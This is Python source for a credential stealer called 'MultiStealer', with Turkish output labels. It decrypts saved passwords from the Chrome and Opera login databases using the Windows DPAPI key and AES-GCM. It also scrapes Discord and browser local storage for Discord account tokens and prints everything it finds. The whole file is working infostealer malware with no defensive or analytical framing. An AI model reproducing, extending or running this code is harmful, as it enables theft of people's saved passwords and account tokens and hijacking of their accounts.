import os
import win32crypt
import shutil
import json
import base64
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import sqlite3
import re
from zipfile import ZipFile

class MultiStealer:
    def __init__(self):
        self.passwords = []
        self.tokens = []

    def get_encryption_key(self, browser_path):
        local_state_path = os.path.join(browser_path, 'Local State')
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(self, encrypted_password, encryption_key):
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return ""

    def steal_browser_data(self, browser_name, db_path):
        try:
            temp_db = 'temp_db'
            shutil.copyfile(db_path, temp_db)
            encryption_key = self.get_encryption_key(os.path.dirname(db_path.replace('Login Data', 'Local State')))
            db = sqlite3.connect(temp_db)
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                if row[1] and row[2]:
                    decrypted_password = self.decrypt_password(row[2], encryption_key)
                    self.passwords.append({'browser': browser_name, 'url': row[0], 'username': row[1], 'password': decrypted_password})
            db.close()
            os.remove(temp_db)
        except Exception as e:
            pass

    def steal_discord_tokens(self):
        paths = {
            'Discord': os.path.join(os.environ['APPDATA'], 'Discord', 'Local Storage', 'leveldb'),
            'Discord Canary': os.path.join(os.environ['APPDATA'], 'discordcanary', 'Local Storage', 'leveldb'),
            'Discord PTB': os.path.join(os.environ['APPDATA'], 'discordptb', 'Local Storage', 'leveldb'),
            'Google Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Opera': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
            'Brave': os.path.join(os.environ['LOCALAPPDATA'], 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Yandex': os.path.join(os.environ['LOCALAPPDATA'], 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Local Storage', 'leveldb')
        }
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                        for token in re.findall(regex, line):
                            self.tokens.append({'source': name, 'token': token})

    def run(self):
        browsers = {
            'Chrome': os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            'Opera': os.path.join(os.environ['APPDATA'], 'Opera Software', 'Opera Stable', 'Login Data')
        }
        for browser_name, db_path in browsers.items():
            if os.path.exists(db_path):
                self.steal_browser_data(browser_name, db_path)

        self.steal_discord_tokens()
        
        # Sonuçları yazdır veya bir dosyaya kaydet
        if self.passwords:
            print("--- ŞİFRELER ---")
            for p in self.passwords:
                print(f"Tarayıcı: {p['browser']} | URL: {p['url']} | Kullanıcı Adı: {p['username']} | Şifre: {p['password']}")
        if self.tokens:
            print("\n--- DİSCORD TOKENLERİ ---")
            for t in self.tokens:
                print(f"Kaynak: {t['source']} | Token: {t['token']}")

if __name__ == '__main__':
    stealer = MultiStealer()
    stealer.run()
